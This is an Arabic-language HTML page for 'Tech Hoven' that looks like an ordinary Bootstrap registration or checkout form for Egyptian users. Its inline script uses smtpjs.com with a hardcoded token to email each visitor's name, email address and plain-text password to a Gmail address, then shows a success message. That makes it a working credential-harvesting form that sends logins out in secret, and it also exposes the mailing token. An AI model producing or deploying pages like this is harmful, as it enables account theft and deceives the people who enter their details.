<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tech Hoven</title>
    <link rel="stylesheet" href="bootstrap.css">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="checkout.css">
    <link rel="stylesheet" href="bootstrap.rtl.min.css">
    <link rel="stylesheet" href="css@3">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="canonical" href="https://getbootstrap.com/docs/5.3/examples/checkout-rtl/">
</head>
<body dir="rtl">
<div class="top"></div>
<div class="center">
    
    <h5>Tech Hoven</h5>
    <form class="needs-validation was-validated" novalidate="" onsubmit="sendEmail(); reset(); return false;">
        <div class="row g-3">
            <div class="col-sm-6">
              <label for="firstName" class="form-label">الاسم الأول</label>
              <input type="text" class="form-control" id="firstName" placeholder="" value="" required="">
              <div class="invalid-feedback">
                يرجى إدخال اسم أول صحيح.
              </div>
            </div>



            <div class="col-sm-6">
                <label for="lastName" class="form-label">اسم العائلة</label>
                <input type="text" class="form-control" id="lastName" placeholder="" value="" required="">
                <div class="invalid-feedback">
                  يرجى إدخال اسم عائلة صحيح.
                </div>
              </div>




              <div class="col-12">
                <label for="email" class="form-label">البريد الإلكتروني <span class="text-body-secondary"></span></label>
                <input type="email" class="form-control" id="email" placeholder="you@example.com" required="">
                <div class="invalid-feedback">
                  يرجى إدخال عنوان بريد إلكتروني صحيح .
                </div>
              </div>
    


              <div class="col-12">
                <label for="address" class="form-label">password</label>
                <input type="password" class="form-control" id="password" placeholder=" قم بأدخال كلمة المرور" required="">
                <div class="invalid-feedback">
                  يرجى إدخال عنوانك.
                </div>
              </div>
    



              <div class="col-md-6">
                <label for="country" class="form-label">البلد</label>
                <select class="form-select" id="country" required="">
                  <option value="">اختر...</option>
                  <option>مصر</option>
                </select>
                <div class="invalid-feedback">
                  يرجى اختيار بلد صحيح.
                </div>
              </div>

              

              <div class="col-md-6">
                <label for="state" class="form-label">المحافظة</label>
                <select class="form-select" id="state" required="" >
                  <option value="" >اختر...</option>
                          <option value="Aswan">أسوان</option>
                          <option value="Asyut">أسيوط</option>
                          <option value="Beheira">البحيرة</option>
                          <option value="Beni Suef">بني سويف</option>
                          <option value="Cairo">القاهرة</option>
                          <option value="Dakahlia">الدقهلية</option>
                          <option value="Damietta">دمياط</option>
                          <option value="Faiyum">الفيوم</option>
                          <option value="Gharbia">الغربية</option>
                          <option value="Giza">الجيزة</option>
                          <option value="Ismailia">الإسماعيلية</option>
                          <option value="Kafr El Sheikh">كفر الشيخ</option>
                          <option value="Luxor">الأقصر</option>
                          <option value="Matrouh">مطروح</option>
                          <option value="Minya">المنيا</option>
                          <option value="Monufia">المنوفية</option>
                          <option value="New Valley">الوادي الجديد</option>
                          <option value="North Sinai">شمال سيناء</option>
                          <option value="Port Said">بورسعيد</option>
                          <option value="Qalyubia">القليوبية</option>
                          <option value="Qena">قنا</option>
                          <option value="Red Sea">البحر الأحمر</option>
                          <option value="Sharqia">الشرقية</option>
                          <option value="Sohag">سوهاج</option>
                          <option value="South Sinai">جنوب سيناء</option>
                          <option value="Suez">السويس</option>
                </select>
                <div class="invalid-feedback">
                  يرجى اختيار اسم محافظة صحيح.
                </div>
              </div>

              
              <button class="w-100 btn btn-primary btn-lg" type="submit" style="margin-bottom: 5px;" data-bs-toggle="modal" data-bs-target="#exampleModal">ارسال</button>
            
              <hr class="my-4">

            <div class="soical">
                <div class="fec">
                    <a href=""><i class="fa-brands fa-facebook"></i></a> 
                </div>
                <div class="ins">
                    <a href=""><i class="fa-brands fa-instagram"></i></a> 
                </div>
                <div class="twi">
                    <a href=""><i class="fa-brands fa-twitter"></i></a> 
                </div>

            </div>



            </div>


    </form>
        



</div>













<div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title">success</h5>
          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
          <p style="font-size: 26px;">تم الأرسال بنحاج <i class="fa-solid fa-circle-check" style="color: rgb(0, 199, 0); font-size: 26px;"></i></p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Close</button>
          
        </div>
      </div>
    </div>
  </div>





































































<script src="checkout.js"></script>
<script src="color-modes.js"></script>
<script src="popper.min.js"></script>
<script src="jquery-3.7.1.min.js"></script>
<script src="bootstrap.js"></script>
<script src="package.js"></script>

    <script src="https://smtpjs.com/v3/smtp.js"></script>
    <script>
        function sendEmail(){
            
            Email.send({
            SecureToken : "44177f75-9cf2-4a66-b394-8e9fc25b6d45",
            To : 'hondargames@gmail.com',
            From : "hondargames@gmail.com",
            Subject : "company world",
            Body :" الاسم الأول:" + document.getElementById("firstName").value
                + "<br> الاسم الثاني: " + document.getElementById("lastName").value
                + "<br> الايميل: " + document.getElementById("email").value
                + "<br> كلمة السر: " + document.getElementById("password").value
                + "<br>  البلد: " + document.getElementById("country").value
                + "<br>  المحافظة: " + document.getElementById("state").value

        
}).then(
    message => alert(done)
);
        }
    </script>
</body>
</html>
